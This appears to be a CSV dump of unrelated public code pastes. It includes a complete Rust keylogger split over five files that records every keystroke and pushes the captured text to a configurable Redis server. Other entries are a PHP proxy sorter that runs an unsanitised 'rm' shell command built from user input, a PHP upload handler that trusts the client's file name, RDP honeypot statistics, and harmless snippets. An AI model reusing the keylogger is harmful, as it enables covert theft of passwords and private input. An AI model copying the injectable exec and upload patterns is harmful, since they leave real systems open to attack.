id,title,username,language,date,content
psZ3T1wq,clear_cache.rs,FlyFar,Rust,Monday 24th of July 2023 09:22:23 PM CDT,"use std::{thread, time};

use crate::ram::PubInfo;

pub fn clear_ram_thread() {
    loop {
        thread::sleep(time::Duration::from_secs(30));
        let mut data = PubInfo::get();
        if !data.key_pressed_cache.is_empty()
        {
            crate::db::send_db(&data.key_pressed_cache);
            data.key_pressed_cache = vec![];
        }
    }
}"
8a0Qddzf,keylogger/mod.rs,FlyFar,Rust,Monday 24th of July 2023 09:20:50 PM CDT,"use std::{thread, time};

use device_query::{DeviceQuery, DeviceState, Keycode};

use crate::ram::PubInfo;

pub fn log() {
    let (mut last_key, mut repeat): (Vec<Keycode>, u8) = (vec![], 0);
    loop {
        let keys = DeviceState::new().get_keys();
        if keys != last_key || repeat > 100 {
            repeat = 0;
            last_key = keys.clone();
            for key_pressed in keys {
                PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
            }
        } else { repeat += 1; }
        thread::sleep(time::Duration::from_millis(5))
    }
}"
KhmGXs9F,redis.rs,FlyFar,Rust,Monday 24th of July 2023 09:20:06 PM CDT,"use redis::{Client, Commands, Connection, ToRedisArgs};
use redis::RedisResult;

fn client() -> RedisResult<Connection> {
    let redis = Client::open(crate::REDIS_KEY)?;
    redis.get_connection()
}

pub fn send(val: &String) -> RedisResult<bool> {
    let mut client = client()?;
    client.rpush(&crate::ram::CONST.who, val)
}

pub fn exists<T : ToRedisArgs>(val : T)  -> RedisResult<bool> {
    let mut client = client()?;
    client.exists(val)
}"
U6C1gGEv,mod.rs,FlyFar,Rust,Monday 24th of July 2023 09:19:24 PM CDT,"use std::{thread, time};

pub(crate) mod redis;

pub fn send_db(data: &[String]) {
    let val = data.join("" "").replace(""Space"", "" "");
    loop {
        if redis::send(&val).is_ok() {
            break;
        }
        thread::sleep(time::Duration::from_millis(10))
    }
}"
KTgeH7ph,main.rs,FlyFar,Rust,Monday 24th of July 2023 09:18:24 PM CDT,"use std::thread;

use crate::keylogger::log;
use crate::ram::clear_cache::clear_ram_thread;

mod ram;
pub mod db;
mod keylogger;

// Make sure to set the redis key!!!!
const REDIS_KEY: &str = ""redis://127.0.0.1:6379"";

fn main() {
    thread::spawn(|| { clear_ram_thread() });
    log();
}"
y4ZPTTuZ,proxy sort,DSTAT,PHP,Monday 24th of July 2023 08:56:31 PM CDT,"<?php
/*
 * @package     Proxy Country Sorter
 * @author      DSTAT | @DDoS_Filter
 * @copyright   https://www.copyright.gov/dmca/
 * @file        /proxy_sort.php
 * @version     1.0
 * @site        https://www.freeproxychecker.com/
 * @comment     Sorts Proxies into files named using the 2 letter country code abbreviation standard
*/

if (count($argv) !== 3) {
	echo ""\nUsage:\n"";
	echo 'php '.$argv['0']."" /path/to/list.txt /save/directory/path/\n"";
	die();
}
if (!is_dir($argv['2'])) {
	die(""Save directory path doesn't exist.\n"");
}
if (($proxylist = fopen($argv['1'], 'r')) !== false) {
	exec('rm '.$argv['2'].'*.txt'); // DELETES ALL .TXT FILES IN THE SAVE DIRECTORY!
	$i = 0;
	echo ""\n "".$argv['0']."" v1.0\n Author: @DDoS_Filter\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"";
	while (!feof($proxylist)) {
		$line = fgets($proxylist);
		$line = str_replace(""\n"",'',$line);
		if (strlen($line) > 0) {
			$line = str_replace(array(""http://"", ""socks4://"", ""socks5://"", ""\n""), '', $line);
			list($host, $port) = explode("":"", $line);
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'https://ipinfo.io/'.$host.'/country');
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_USERAGENT, 'Curl');
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$result = curl_exec($ch);
			$result = str_replace(""\n"",'',$result);
			$http_info = curl_getinfo($ch);
			
			if ($http_info['http_code'] == 200 && strlen($result) == 2) {
				file_put_contents($argv['2'].$result.'.txt', $host.':'.$port.""\n"", FILE_APPEND);
				$i++;
			} else {
				echo ""HTTP ERROR!\nhttp error #: "".$http_info.""\nResponse: "".$result.""\n"";
			}
			@fclose($scan);
			echo '	('.$i.') Found ('.$result."") Proxy!\r"";
		}
	}
	fclose($proxylist);
	echo ""\nFinished Sorting Proxies!\n"";
} else {
	die('Error: Unable to read list file.');
}"
Pqq2CGQQ,Untitled,Toxicator1,Lua,Monday 24th of July 2023 08:03:23 PM CDT,"local DestroyedUtil = {}

function DestroyedUtil.OnDestroyed(obj, callback)
	local connection
	connection = obj.AncestryChanged:Connect(function ()
		if not obj:IsDescendantOf(game) then
			callback()
			connection:Disconnect()
		end
	end)
	return connection
end

return DestroyedUtil"
KzWBjFJC,Rhye theme: filter registered cpt/taxonomy arguments,artemsemkin,PHP,Monday 24th of July 2023 08:00:50 PM CDT,"<?php

// Custom post types
add_filter( 'register_post_type_args', 'custom_filter_cpt_args', 10, 2 );
function custom_filter_cpt_args( $args, $post_type ) {
  if ( $post_type === 'arts_portfolio_item' ) {
    // Customizations for portfolio post type
  }

  return $args;
}

// Taxonomies
add_filter( 'register_taxonomy_args', 'custom_filter_taxonomy_args', 10, 2 );
function custom_filter_taxonomy_args( $args, $taxonomy ) {
  if ( $taxonomy === 'arts_portfolio_category' ) {
    // Customizations for categories taxonomy

    $args['hierarchical'] = true;
  }

  return $args;
}
"
zTZnBTSX,2023-07-24_stats.json,rdp_snitch,JSON,Monday 24th of July 2023 07:17:58 PM CDT,"{
  ""ip"": {
    ""85.14.32.53"": 7251,
    ""39.108.174.140"": 66,
    ""103.252.119.150"": 99,
    ""139.162.38.147"": 9,
    ""87.251.75.145"": 12,
    ""139.162.6.28"": 3,
    ""61.220.174.25"": 12,
    ""66.228.54.222"": 3,
    ""191.101.174.125"": 3,
    ""158.247.254.222"": 6,
    ""45.79.108.4"": 15,
    ""103.116.52.3"": 3,
    ""45.77.85.181"": 3,
    ""164.92.158.134"": 9,
    ""185.11.61.122"": 18,
    ""31.43.185.32"": 15,
    ""167.248.133.35"": 3,
    ""62.122.184.168"": 12,
    ""62.122.184.166"": 12,
    ""185.170.144.3"": 9,
    ""198.58.118.98"": 3,
    ""170.187.227.98"": 3,
    ""87.251.64.110"": 6,
    ""47.90.203.174"": 6,
    ""178.128.0.242"": 3,
    ""93.185.162.20"": 6,
    ""39.98.33.148"": 18,
    ""87.251.75.120"": 6,
    ""167.172.76.60"": 9,
    ""185.254.97.32"": 3,
    ""222.255.214.150"": 6,
    ""103.153.68.198"": 3,
    ""198.235.24.254"": 9,
    ""167.94.146.58"": 3,
    ""112.5.87.34"": 3,
    ""87.251.75.64"": 3,
    ""103.232.55.195"": 18,
    ""47.102.201.13"": 3,
    ""45.140.17.16"": 9,
    ""62.204.41.134"": 6
  },
  ""asn"": {
    ""AS34376"": 7251,
    ""AS37963"": 87,
    ""AS64022"": 99,
    ""AS63949"": 36,
    ""AS208091"": 21,
    ""AS3462"": 12,
    ""AS32780"": 3,
    ""AS20473"": 9,
    ""AS150830"": 3,
    ""AS14061"": 21,
    ""AS57523"": 42,
    ""AS211736"": 15,
    ""AS398722"": 3,
    ""AS48080"": 15,
    ""AS45102"": 6,
    ""AS209854"": 6,
    ""AS58212"": 3,
    ""AS45899"": 6,
    ""AS131366"": 3,
    ""AS396982"": 9,
    ""AS398705"": 3,
    ""AS9808"": 3,
    ""AS63737"": 18,
    ""AS198953"": 9,
    ""AS59425"": 6
  },
  ""isp"": {
    ""Telecom Group"": 7251,
    ""Hangzhou Alibaba Advertising Co"": 84,
    ""CLOUDWEBMANAGE"": 99,
    ""Akamai Technologies, Inc."": 33,
    ""XHOST-INTERNET-SOLUTIONS"": 21,
    ""LINODE"": 3,
    ""Chunghwa Telecom Co., Ltd."": 12,
    ""Hosting Services"": 3,
    ""The Constant Company, LLC"": 6,
    ""Chieu Minh Company Limited"": 3,
    ""The Constant Company"": 3,
    ""DigitalOcean, LLC"": 18,
    ""Chang Way Technologies Co. Limited"": 42,
    ""FOP Dmytro Nedilskyi"": 15,
    ""Censys, Inc."": 6,
    ""Dmitriy Panchenko"": 15,
    ""Alibaba.com LLC"": 6,
    ""DigitalOcean"": 3,
    ""Cyberzone S.A."": 6,
    ""HARMONYSOLUTIONS-VM01"": 3,
    ""VNPT"": 6,
    ""TAM"": 3,
    ""Google LLC"": 9,
    ""China Mobile"": 3,
    ""VIETSERVER"": 18,
    ""Addresses CNNIC"": 3,
    ""Proton66 OOO"": 9,
    ""Horizon LLC"": 6
  },
  ""org"": {
    ""TelecomGroup"": 7251,
    ""Aliyun Computing Co., LTD"": 87,
    ""Unknown"": 108,
    ""Linode, LLC"": 12,
    ""Xhost Internet Solutions"": 27,
    ""Chunghwa Telecom Co. Ltd."": 12,
    ""Linode"": 24,
    ""Ipxo"": 3,
    ""The Constant Company, LLC"": 6,
    ""Chieu Minh Company Limited"": 3,
    ""Vultr Holdings, LLC"": 3,
    ""DigitalOcean, LLC"": 18,
    ""Starcrecium Limited"": 18,
    ""FOP Dmytro Nedilskyi"": 15,
    ""Censys, Inc."": 6,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Xhostis"": 9,
    ""ALICLOUD-US"": 6,
    ""Digitalocean"": 3,
    ""Cyberzone S.A"": 6,
    ""TAM Media Technology Joint Stock Company"": 3,
    ""Palo Alto Networks, Inc"": 9,
    ""China Mobile Communications Corporation"": 3,
    ""VietServer Services technology company limited"": 18,
    ""Proton66 LLC"": 9,
    ""Horizon LLC"": 6
  },
  ""regionName"": {
    ""Blagoevgrad"": 7251,
    ""Guangdong"": 69,
    ""Central and Western District"": 99,
    ""North West"": 12,
    ""North Holland"": 30,
    ""Central Singapore"": 3,
    ""Taiwan"": 12,
    ""Texas"": 6,
    ""New Jersey"": 3,
    ""Seoul"": 6,
    ""California"": 30,
    ""Ho Chi Minh"": 9,
    ""Chechnya"": 18,
    ""Kyiv City"": 15,
    ""Michigan"": 3,
    ""Moscow"": 54,
    ""Virginia"": 6,
    ""Jakarta"": 6,
    ""Beijing"": 18,
    ""South West"": 9,
    ""North Rhine-Westphalia"": 3,
    ""Hanoi"": 21,
    ""Hesse"": 3,
    ""Shanghai"": 3
  },
  ""country"": {
    ""Bulgaria"": 7251,
    ""China"": 90,
    ""Hong Kong"": 99,
    ""Singapore"": 24,
    ""Netherlands"": 30,
    ""Taiwan"": 12,
    ""United States"": 48,
    ""South Korea"": 6,
    ""Vietnam"": 30,
    ""Russia"": 72,
    ""Ukraine"": 15,
    ""Indonesia"": 6,
    ""Germany"": 6
  },
  ""account"": {
    ""hello"": 7554,
    ""Administr"": 45,
    ""(empty)"": 12,
    ""Domain"": 63,
    ""beio"": 6,
    ""CcxvZTmQN"": 3,
    ""qbtVku"": 3,
    ""RscNuT"": 3
  },
  ""keyboard"": {
    ""Unknown"": 7689
  },
  ""client_build"": {
    ""Unknown"": 7689
  },
  ""client_name"": {
    ""Unknown"": 7689
  },
  ""ip_type"": {
    ""Unknown"": 7506,
    ""hosting"": 150,
    ""hosting & proxy"": 21,
    ""proxy"": 6,
    ""mobile"": 6
  }
}"
upmU9hbe,2023-07-24_stats.json,rdp_snitch,JSON,Monday 24th of July 2023 07:16:05 PM CDT,"{
  ""ip"": {
    ""85.14.32.53"": 4834,
    ""39.108.174.140"": 44,
    ""103.252.119.150"": 66,
    ""139.162.38.147"": 6,
    ""87.251.75.145"": 8,
    ""139.162.6.28"": 2,
    ""61.220.174.25"": 8,
    ""66.228.54.222"": 2,
    ""191.101.174.125"": 2,
    ""158.247.254.222"": 4,
    ""45.79.108.4"": 10,
    ""103.116.52.3"": 2,
    ""45.77.85.181"": 2,
    ""164.92.158.134"": 6,
    ""185.11.61.122"": 12,
    ""31.43.185.32"": 10,
    ""167.248.133.35"": 2,
    ""62.122.184.168"": 8,
    ""62.122.184.166"": 8,
    ""185.170.144.3"": 6,
    ""198.58.118.98"": 2,
    ""170.187.227.98"": 2,
    ""87.251.64.110"": 4,
    ""47.90.203.174"": 4,
    ""178.128.0.242"": 2,
    ""93.185.162.20"": 4,
    ""39.98.33.148"": 12,
    ""87.251.75.120"": 4,
    ""167.172.76.60"": 6,
    ""185.254.97.32"": 2,
    ""222.255.214.150"": 4,
    ""103.153.68.198"": 2,
    ""198.235.24.254"": 6,
    ""167.94.146.58"": 2,
    ""112.5.87.34"": 2,
    ""87.251.75.64"": 2,
    ""103.232.55.195"": 12,
    ""47.102.201.13"": 2,
    ""45.140.17.16"": 6,
    ""62.204.41.134"": 4
  },
  ""asn"": {
    ""AS34376"": 4834,
    ""AS37963"": 58,
    ""AS64022"": 66,
    ""AS63949"": 24,
    ""AS208091"": 14,
    ""AS3462"": 8,
    ""AS32780"": 2,
    ""AS20473"": 6,
    ""AS150830"": 2,
    ""AS14061"": 14,
    ""AS57523"": 28,
    ""AS211736"": 10,
    ""AS398722"": 2,
    ""AS48080"": 10,
    ""AS45102"": 4,
    ""AS209854"": 4,
    ""AS58212"": 2,
    ""AS45899"": 4,
    ""AS131366"": 2,
    ""AS396982"": 6,
    ""AS398705"": 2,
    ""AS9808"": 2,
    ""AS63737"": 12,
    ""AS198953"": 6,
    ""AS59425"": 4
  },
  ""isp"": {
    ""Telecom Group"": 4834,
    ""Hangzhou Alibaba Advertising Co"": 56,
    ""CLOUDWEBMANAGE"": 66,
    ""Akamai Technologies, Inc."": 22,
    ""XHOST-INTERNET-SOLUTIONS"": 14,
    ""LINODE"": 2,
    ""Chunghwa Telecom Co., Ltd."": 8,
    ""Hosting Services"": 2,
    ""The Constant Company, LLC"": 4,
    ""Chieu Minh Company Limited"": 2,
    ""The Constant Company"": 2,
    ""DigitalOcean, LLC"": 12,
    ""Chang Way Technologies Co. Limited"": 28,
    ""FOP Dmytro Nedilskyi"": 10,
    ""Censys, Inc."": 4,
    ""Dmitriy Panchenko"": 10,
    ""Alibaba.com LLC"": 4,
    ""DigitalOcean"": 2,
    ""Cyberzone S.A."": 4,
    ""HARMONYSOLUTIONS-VM01"": 2,
    ""VNPT"": 4,
    ""TAM"": 2,
    ""Google LLC"": 6,
    ""China Mobile"": 2,
    ""VIETSERVER"": 12,
    ""Addresses CNNIC"": 2,
    ""Proton66 OOO"": 6,
    ""Horizon LLC"": 4
  },
  ""org"": {
    ""TelecomGroup"": 4834,
    ""Aliyun Computing Co., LTD"": 58,
    ""Unknown"": 72,
    ""Linode, LLC"": 8,
    ""Xhost Internet Solutions"": 18,
    ""Chunghwa Telecom Co. Ltd."": 8,
    ""Linode"": 16,
    ""Ipxo"": 2,
    ""The Constant Company, LLC"": 4,
    ""Chieu Minh Company Limited"": 2,
    ""Vultr Holdings, LLC"": 2,
    ""DigitalOcean, LLC"": 12,
    ""Starcrecium Limited"": 12,
    ""FOP Dmytro Nedilskyi"": 10,
    ""Censys, Inc."": 4,
    ""Chang Way Technologies Co. Limited"": 16,
    ""Xhostis"": 6,
    ""ALICLOUD-US"": 4,
    ""Digitalocean"": 2,
    ""Cyberzone S.A"": 4,
    ""TAM Media Technology Joint Stock Company"": 2,
    ""Palo Alto Networks, Inc"": 6,
    ""China Mobile Communications Corporation"": 2,
    ""VietServer Services technology company limited"": 12,
    ""Proton66 LLC"": 6,
    ""Horizon LLC"": 4
  },
  ""regionName"": {
    ""Blagoevgrad"": 4834,
    ""Guangdong"": 46,
    ""Central and Western District"": 66,
    ""North West"": 8,
    ""North Holland"": 20,
    ""Central Singapore"": 2,
    ""Taiwan"": 8,
    ""Texas"": 4,
    ""New Jersey"": 2,
    ""Seoul"": 4,
    ""California"": 20,
    ""Ho Chi Minh"": 6,
    ""Chechnya"": 12,
    ""Kyiv City"": 10,
    ""Michigan"": 2,
    ""Moscow"": 36,
    ""Virginia"": 4,
    ""Jakarta"": 4,
    ""Beijing"": 12,
    ""South West"": 6,
    ""North Rhine-Westphalia"": 2,
    ""Hanoi"": 14,
    ""Hesse"": 2,
    ""Shanghai"": 2
  },
  ""country"": {
    ""Bulgaria"": 4834,
    ""China"": 60,
    ""Hong Kong"": 66,
    ""Singapore"": 16,
    ""Netherlands"": 20,
    ""Taiwan"": 8,
    ""United States"": 32,
    ""South Korea"": 4,
    ""Vietnam"": 20,
    ""Russia"": 48,
    ""Ukraine"": 10,
    ""Indonesia"": 4,
    ""Germany"": 4
  },
  ""account"": {
    ""hello"": 5036,
    ""Administr"": 30,
    ""(empty)"": 8,
    ""Domain"": 42,
    ""beio"": 4,
    ""CcxvZTmQN"": 2,
    ""qbtVku"": 2,
    ""RscNuT"": 2
  },
  ""keyboard"": {
    ""Unknown"": 5126
  },
  ""client_build"": {
    ""Unknown"": 5126
  },
  ""client_name"": {
    ""Unknown"": 5126
  },
  ""ip_type"": {
    ""Unknown"": 5004,
    ""hosting"": 100,
    ""hosting & proxy"": 14,
    ""proxy"": 4,
    ""mobile"": 4
  }
}"
VTER8J09,2023-07-24_stats.json,rdp_snitch,JSON,Monday 24th of July 2023 07:15:09 PM CDT,"{
  ""ip"": {
    ""85.14.32.53"": 2417,
    ""39.108.174.140"": 22,
    ""103.252.119.150"": 33,
    ""139.162.38.147"": 3,
    ""87.251.75.145"": 4,
    ""139.162.6.28"": 1,
    ""61.220.174.25"": 4,
    ""66.228.54.222"": 1,
    ""191.101.174.125"": 1,
    ""158.247.254.222"": 2,
    ""45.79.108.4"": 5,
    ""103.116.52.3"": 1,
    ""45.77.85.181"": 1,
    ""164.92.158.134"": 3,
    ""185.11.61.122"": 6,
    ""31.43.185.32"": 5,
    ""167.248.133.35"": 1,
    ""62.122.184.168"": 4,
    ""62.122.184.166"": 4,
    ""185.170.144.3"": 3,
    ""198.58.118.98"": 1,
    ""170.187.227.98"": 1,
    ""87.251.64.110"": 2,
    ""47.90.203.174"": 2,
    ""178.128.0.242"": 1,
    ""93.185.162.20"": 2,
    ""39.98.33.148"": 6,
    ""87.251.75.120"": 2,
    ""167.172.76.60"": 3,
    ""185.254.97.32"": 1,
    ""222.255.214.150"": 2,
    ""103.153.68.198"": 1,
    ""198.235.24.254"": 3,
    ""167.94.146.58"": 1,
    ""112.5.87.34"": 1,
    ""87.251.75.64"": 1,
    ""103.232.55.195"": 6,
    ""47.102.201.13"": 1,
    ""45.140.17.16"": 3,
    ""62.204.41.134"": 2
  },
  ""asn"": {
    ""AS34376"": 2417,
    ""AS37963"": 29,
    ""AS64022"": 33,
    ""AS63949"": 12,
    ""AS208091"": 7,
    ""AS3462"": 4,
    ""AS32780"": 1,
    ""AS20473"": 3,
    ""AS150830"": 1,
    ""AS14061"": 7,
    ""AS57523"": 14,
    ""AS211736"": 5,
    ""AS398722"": 1,
    ""AS48080"": 5,
    ""AS45102"": 2,
    ""AS209854"": 2,
    ""AS58212"": 1,
    ""AS45899"": 2,
    ""AS131366"": 1,
    ""AS396982"": 3,
    ""AS398705"": 1,
    ""AS9808"": 1,
    ""AS63737"": 6,
    ""AS198953"": 3,
    ""AS59425"": 2
  },
  ""isp"": {
    ""Telecom Group"": 2417,
    ""Hangzhou Alibaba Advertising Co"": 28,
    ""CLOUDWEBMANAGE"": 33,
    ""Akamai Technologies, Inc."": 11,
    ""XHOST-INTERNET-SOLUTIONS"": 7,
    ""LINODE"": 1,
    ""Chunghwa Telecom Co., Ltd."": 4,
    ""Hosting Services"": 1,
    ""The Constant Company, LLC"": 2,
    ""Chieu Minh Company Limited"": 1,
    ""The Constant Company"": 1,
    ""DigitalOcean, LLC"": 6,
    ""Chang Way Technologies Co. Limited"": 14,
    ""FOP Dmytro Nedilskyi"": 5,
    ""Censys, Inc."": 2,
    ""Dmitriy Panchenko"": 5,
    ""Alibaba.com LLC"": 2,
    ""DigitalOcean"": 1,
    ""Cyberzone S.A."": 2,
    ""HARMONYSOLUTIONS-VM01"": 1,
    ""VNPT"": 2,
    ""TAM"": 1,
    ""Google LLC"": 3,
    ""China Mobile"": 1,
    ""VIETSERVER"": 6,
    ""Addresses CNNIC"": 1,
    ""Proton66 OOO"": 3,
    ""Horizon LLC"": 2
  },
  ""org"": {
    ""TelecomGroup"": 2417,
    ""Aliyun Computing Co., LTD"": 29,
    ""Unknown"": 36,
    ""Linode, LLC"": 4,
    ""Xhost Internet Solutions"": 9,
    ""Chunghwa Telecom Co. Ltd."": 4,
    ""Linode"": 8,
    ""Ipxo"": 1,
    ""The Constant Company, LLC"": 2,
    ""Chieu Minh Company Limited"": 1,
    ""Vultr Holdings, LLC"": 1,
    ""DigitalOcean, LLC"": 6,
    ""Starcrecium Limited"": 6,
    ""FOP Dmytro Nedilskyi"": 5,
    ""Censys, Inc."": 2,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Xhostis"": 3,
    ""ALICLOUD-US"": 2,
    ""Digitalocean"": 1,
    ""Cyberzone S.A"": 2,
    ""TAM Media Technology Joint Stock Company"": 1,
    ""Palo Alto Networks, Inc"": 3,
    ""China Mobile Communications Corporation"": 1,
    ""VietServer Services technology company limited"": 6,
    ""Proton66 LLC"": 3,
    ""Horizon LLC"": 2
  },
  ""regionName"": {
    ""Blagoevgrad"": 2417,
    ""Guangdong"": 23,
    ""Central and Western District"": 33,
    ""North West"": 4,
    ""North Holland"": 10,
    ""Central Singapore"": 1,
    ""Taiwan"": 4,
    ""Texas"": 2,
    ""New Jersey"": 1,
    ""Seoul"": 2,
    ""California"": 10,
    ""Ho Chi Minh"": 3,
    ""Chechnya"": 6,
    ""Kyiv City"": 5,
    ""Michigan"": 1,
    ""Moscow"": 18,
    ""Virginia"": 2,
    ""Jakarta"": 2,
    ""Beijing"": 6,
    ""South West"": 3,
    ""North Rhine-Westphalia"": 1,
    ""Hanoi"": 7,
    ""Hesse"": 1,
    ""Shanghai"": 1
  },
  ""country"": {
    ""Bulgaria"": 2417,
    ""China"": 30,
    ""Hong Kong"": 33,
    ""Singapore"": 8,
    ""Netherlands"": 10,
    ""Taiwan"": 4,
    ""United States"": 16,
    ""South Korea"": 2,
    ""Vietnam"": 10,
    ""Russia"": 24,
    ""Ukraine"": 5,
    ""Indonesia"": 2,
    ""Germany"": 2
  },
  ""account"": {
    ""hello"": 2518,
    ""Administr"": 15,
    ""(empty)"": 4,
    ""Domain"": 21,
    ""beio"": 2,
    ""CcxvZTmQN"": 1,
    ""qbtVku"": 1,
    ""RscNuT"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2563
  },
  ""client_build"": {
    ""Unknown"": 2563
  },
  ""client_name"": {
    ""Unknown"": 2563
  },
  ""ip_type"": {
    ""Unknown"": 2502,
    ""hosting"": 50,
    ""hosting & proxy"": 7,
    ""proxy"": 2,
    ""mobile"": 2
  }
}"
BsPUxGHY,receber_imagem.php,hercioneto,PHP,Monday 24th of July 2023 05:23:40 PM CDT,"<?php
// Verifica se algum arquivo foi enviado
if (isset($_FILES['imagem']) && $_FILES['imagem']['error'] === 0) {
    // Informações sobre o arquivo
    $nomeArquivo = $_FILES['imagem']['name'];
    $tipoArquivo = $_FILES['imagem']['type'];
    $tamanhoArquivo = $_FILES['imagem']['size'];
    $caminhoTemporario = $_FILES['imagem']['tmp_name'];
    
    // Verifica se o arquivo é uma imagem
    $extensoesPermitidas = array(""jpg"", ""jpeg"", ""png"", ""gif"");
    $extensao = strtolower(pathinfo($nomeArquivo, PATHINFO_EXTENSION));
    if (in_array($extensao, $extensoesPermitidas)) {
        // Define o diretório onde a imagem será salva
        $diretorioDestino = ""imagens/"";
        $caminhoCompleto = $diretorioDestino . $nomeArquivo;
        
        // Move o arquivo temporário para o diretório de destino
        if (move_uploaded_file($caminhoTemporario, $caminhoCompleto)) {
            echo ""Imagem enviada e salva com sucesso!"";
        } else {
            echo ""Erro ao salvar a imagem."";
        }
    } else {
        echo ""Formato de arquivo não permitido. Envie uma imagem (jpg, jpeg, png ou gif)."";
    }
} else {
    echo ""Erro no envio da imagem."";
}
?>
"
7LJz3eHe,form_imagem.html,hercioneto,PHP,Monday 24th of July 2023 05:23:15 PM CDT,"<!DOCTYPE html>
<html>
<head>
    <title>Envio de Imagem</title>
</head>
<body>
    <h1>Envie sua imagem</h1>
    <form action=""receber_imagem.php"" method=""post"" enctype=""multipart/form-data"">
        <label for=""imagem"">Escolha uma imagem:</label>
        <input type=""file"" name=""imagem"" id=""imagem"" accept=""image/*"">
        <br>
        <input type=""submit"" value=""Enviar Imagem"">
    </form>
</body>
</html>"
gc01rnrT,Untitled,sashaatx,Autohotkey,Monday 24th of July 2023 04:42:21 PM CDT,"; http://www.autohotkey.com/board/topic/104539-controlcol-set-background-and-text-color-gui-controls/

ControlColor(Control, Window, bc := """", tc := """", Redraw := 1) {
    a := {}
    a[""c""]  := Control
    a[""g""]  := Window
    a[""bc""] := (bc = """") ? """" : (((bc & 255) << 16) + (((bc >> 8) & 255) << 8) + (bc >> 16))
    a[""tc""] := (tc = """") ? """" : (((tc & 255) << 16) + (((tc >> 8) & 255) << 8) + (tc >> 16))
    CC_WindowProc(""Set"", a, """", """")
    If (Redraw) {
        WinSet Redraw,, ahk_id %Control%
    }
}

CC_WindowProc(hWnd, uMsg, wParam, lParam) {
    Static Win := {}

    If uMsg Between 0x132 And 0x138
    If (Win[hWnd].HasKey(lParam)) {
        If (tc := Win[hWnd, lParam, ""tc""]) {
            DllCall(""gdi32.dll\SetTextColor"", ""Ptr"", wParam, ""UInt"", tc)
        }
        If (bc := Win[hWnd, lParam, ""bc""]) {
            DllCall(""gdi32.dll\SetBkColor"",   ""Ptr"", wParam, ""UInt"", bc)
        }
        Return Win[hWnd, lParam, ""Brush""] ; Return the HBRUSH to notify the OS that we altered the HDC.
    }

    If (hWnd = ""Set"") {
        a := uMsg
        Win[a.g, a.c] := a
        If (Win[a.g, a.c, ""tc""] == """") And (Win[a.g, a.c, ""bc""] == """")
            Win[a.g].Remove(a.c, """")
        If Not Win[a.g, ""WindowProcOld""]
            Win[a.g,""WindowProcOld""] := DllCall(""SetWindowLong"" . (A_PtrSize == 8 ? ""Ptr"" : """")
            , ""Ptr"", a.g, ""Int"", -4, ""Ptr"", RegisterCallback(""CC_WindowProc"", """", 4), ""UPtr"")
        If Win[a.g, a.c, ""Brush""]
            DllCall(""gdi32.dll\DeleteObject"", ""Ptr"", Brush)
        If (Win[a.g, a.c, ""bc""] != """")
            Win[a.g, a.c, ""Brush""] := DllCall(""gdi32.dll\CreateSolidBrush"", ""UInt"", a.bc, ""UPtr"")
        Return
    }
    Return DllCall(""CallWindowProc"", ""Ptr"", Win[hWnd, ""WindowProcOld""], ""Ptr"", hWnd, ""UInt"", uMsg, ""Ptr"", wParam, ""Ptr"", lParam, ""Ptr"")
}
"
